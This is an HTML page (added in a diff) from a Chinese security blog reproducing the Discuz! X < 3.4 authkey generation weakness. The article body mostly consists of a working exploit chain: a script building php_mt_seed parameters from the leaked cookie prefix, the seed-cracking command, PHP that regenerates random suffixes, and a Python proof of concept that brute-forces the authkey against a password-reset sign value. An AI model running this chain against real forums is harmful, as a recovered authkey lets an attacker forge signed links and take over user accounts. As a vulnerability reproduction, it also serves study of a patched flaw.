@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Discuz! X &lt; 3.4 authkey 算法的安全性漏洞一、漏洞简介2017年8月1日，Discuz!发布了X3.4版本，此次更新中修复了authkey生成算法的安全性漏洞，通过authkey安全性漏洞，我们可以获得authkey。系统中逻辑大量使用authkey以及authcode算法，通过该漏洞可导致一系列安全问题：邮箱校验的hash参数被破解，导致任意用户绑定邮箱可被修改等…">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X%20_%203.4%20authkey%20%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Discuz! X &lt; 3.4 authkey 算法的安全性漏洞一、漏洞简介2017年8月1日，Discuz!发布了X3.4版本，此次更新中修复了authkey生成算法的安全性漏洞，通过authkey安全性漏洞，我们可以获得authkey。系统中逻辑大量使用authkey以及authcode算法，通过该漏洞可导致一系列安全问题：邮箱校验的hash参数被破解，导致任意用户绑定邮箱可被修改等…">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId33.png">
+<meta property="article:published_time" content="2022-07-08T06:25:54.582Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Discuz/Discuz! X _ 3.4 authkey 算法的安全性漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Discuz/Discuz!%20X%20_%203.4%20authkey%20%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.582Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Discuz-X-lt-3-4-authkey-算法的安全性漏洞"><a href="#Discuz-X-lt-3-4-authkey-算法的安全性漏洞" class="headerlink" title="Discuz! X &lt; 3.4 authkey 算法的安全性漏洞"></a>Discuz! X &lt; 3.4 authkey 算法的安全性漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>2017年8月1日，Discuz!发布了X3.4版本，此次更新中修复了authkey生成算法的安全性漏洞，通过authkey安全性漏洞，我们可以获得authkey。系统中逻辑大量使用authkey以及authcode算法，通过该漏洞可导致一系列安全问题：邮箱校验的hash参数被破解，导致任意用户绑定邮箱可被修改等…</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>php&gt;5.3+php-curl&lt;=7.54</p>
+<ul>
+<li><p>  Discuz_X3.3_SC_GBK</p>
+</li>
+<li><p>  Discuz_X3.3_SC_UTF8</p>
+</li>
+<li><p>  Discuz_X3.3_TC_BIG5</p>
+</li>
+<li><p>  Discuz_X3.3_TC_UTF8</p>
+</li>
+<li><p>  Discuz_X3.2_SC_GBK</p>
+</li>
+<li><p>  Discuz_X3.2_SC_UTF8</p>
+</li>
+<li><p>  Discuz_X3.2_TC_BIG5</p>
+</li>
+<li><p>  Discuz_X3.2_TC_UTF8</p>
+</li>
+<li><p>  Discuz_X2.5_SC_GBK</p>
+</li>
+<li><p>  Discuz_X2.5_SC_UTF8</p>
+</li>
+<li><p>  Discuz_X2.5_TC_BIG5</p>
+</li>
+<li><p>  Discuz_X2.5_TC_UTF8</p>
+</li>
+</ul>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在dz3.3/upload/install/index.php 346行</p>
+<p><img src="/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p>我们看到authkey是由多个参数的md5前6位加上random生成的10位产生的。</p>
+<p>跟入random函数</p>
+<p><img src="/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<p>当php版本大于4.2.0时，随机数种子不会改变</p>
+<p>我们可以看到在生成authkey之后，使用random函数生成了4位cookie前缀</p>
+<pre><code>$_config[&#39;cookie&#39;][&#39;cookiepre&#39;] = random(4).&#39;_&#39;;
+</code></pre>
+<p>那么这4位cookie前缀就是我们可以得到的，那我们就可以使用字符集加上4位已知字符，爆破随机数种子。</p>
+<p>首先我们需要先获得4位字符</p>
+<p><img src="/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<blockquote>
+<p>如上图所示，前四位是<strong>sW7c</strong></p>
+</blockquote>
+<p>然后通过脚本生成用于php_mt_seed的参数</p>
+<blockquote>
+<p>这里需要修改第13行代码，替换你自己的cookie前四位</p>
+</blockquote>
+<pre><code># coding=utf-8
+w_len = 10
+result = &quot;&quot;
+str_list = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&quot;
+length = len(str_list)
+for i in xrange(w_len):
+    result+=&quot;0 &quot;
+    result+=str(length-1)
+    result+=&quot; &quot;
+    result+=&quot;0 &quot;
+    result+=str(length-1)
+    result+=&quot; &quot;
+sstr = &quot;sW7c&quot;
+for i in sstr:
+    result+=str(str_list.index(i))
+    result+=&quot; &quot;
+    result+=str(str_list.index(i))
+    result+=&quot; &quot;
+    result+=&quot;0 &quot;
+    result+=str(length-1)
+    result+=&quot; &quot;
+print result
+</code></pre>
+<p>得到参数,使用php_mt_seed脚本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/php-mt/_rand">https://github.com/ianxtianxt/php-mt\_rand</a></p>
+<pre><code>./php_mt_seed 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 54 54 0 61 22 22 0 61 33 33 0 61 38 38 0 61 &gt; result.txt
+</code></pre>
+<p>这里我获得了245组种子</p>
+<p>接下来我们需要使用这245组随机数种子生成随机字符串</p>
+<pre><code>&lt;?php
+function random($length) &#123;
+    $hash = &#39;&#39;;
+    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;;
+    $max = strlen($chars) - 1;
+    PHP_VERSION &lt; &#39;4.2.0&#39; &amp;&amp; mt_srand((double)microtime() * 1000000);
+    for($i = 0; $i &lt; $length; $i++) &#123;
+        $hash .= $chars[mt_rand(0, $max)];
+    &#125;
+    return $hash;
+&#125;
+$fp = fopen(&#39;result.txt&#39;, &#39;rb&#39;);
+$fp2 = fopen(&#39;result2.txt&#39;, &#39;wb&#39;);
+while(!feof($fp))&#123;
+    $b = fgets($fp, 4096);
+    if(preg_match(&quot;/seed = (\d)+/&quot;, $b, $matach))&#123;
+        $m = $matach[0];
+    &#125;else&#123;
+        continue;
+    &#125;
+    // var_dump(substr($m,7));
+    mt_srand(substr($m,7));
+    fwrite($fp2, random(10).&quot;\n&quot;);
+&#125;
+fclose($fp);
+fclose($fp2);
+</code></pre>
+<p>当我们获得了所有的后缀时，我们需要配合爆破6位字符（0-9a-f）来验证authkey的正确性,由于的数量差不多16**6*200+,为了在有限的时间内爆破出来，我们需要使用一个本地爆破的方式。</p>
+<p>这里使用了找回密码中的id和sign参数，让我们一起来看看逻辑。</p>
+<p>当我们点击忘记密码的时候。</p>
+<p>会进入<code>/source/module/member/member_lostpasswd.php</code><br>65行生成用于验证的sign值。</p>
+<p><img src="/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<p>跟随make_getpws_sign函数进入<code>/source/function/function_member.php</code></p>
+<p><img src="/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<p>然后进入dsign函数，配合authkey生成结果</p>
+<p><img src="/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
+<p>这里我们可以用python模拟这个过程，然后通过找回密码获得uid、id、sign，爆破判断结果。</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.0-sec.org/dz3.3/member?mod=getpasswd&amp;uid=2&amp;id=vnY6nW&amp;sign=af3b937d0132a06b">http://www.0-sec.org/dz3.3/member?mod=getpasswd&amp;uid=2&amp;id=vnY6nW&amp;sign=af3b937d0132a06b</a></p>
+<p>自行修改第7,8,13行代码</p>
+</blockquote>
+<pre><code># coding=utf-8
+import itertools
+import hashlib
+import time
+def dsign(authkey):
+    url = &quot;http://127.0.0.1/dz3.3/&quot;
+    idstring = &quot;vnY6nW&quot;
+    uid = 2
+    uurl = &quot;&#123;&#125;member.php?mod=getpasswd&amp;uid=&#123;&#125;&amp;id=&#123;&#125;&quot;.format(url, uid, idstring)
+    url_md5 = hashlib.md5(uurl+authkey)
+    return url_md5.hexdigest()[:16]
+def main():
+    sign = &quot;af3b937d0132a06b&quot;
+    str_list = &quot;0123456789abcdef&quot;
+    with open(&#39;result2.txt&#39;) as f:
+        ranlist = [s[:-1] for s in f]
+    s_list = sorted(set(ranlist), key=ranlist.index)
+    r_list = itertools.product(str_list, repeat=6)
+    print &quot;[!] start running....&quot;
+    s_time = time.time()
+    for j in r_list:
+        for s in s_list:
+            prefix = &quot;&quot;.join(j)
+            authkey = prefix + s
+            # print dsign(authkey)
+            if dsign(authkey) == sign:
+                print &quot;[*] found used time: &quot; + str(time.time() - s_time)
+                return &quot;[*] authkey found: &quot; + authkey
+print main()
+</code></pre>
+<p><img src="/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
+<p><img src="/resource/Discuz!X%3C3.4authkey%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://lorexxar.cn/2017/08/31/dz-authkey//#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85">https://lorexxar.cn/2017/08/31/dz-authkey/\#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X%20_%203.4%20authkey%20%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnsj004qy8v1dt9m9ocs" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Discuz/Discuz!%20X%20_%203.4%20uc_center%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Discuz/Discuz!%20X%20Windows%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AF%BC%E8%87%B4%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
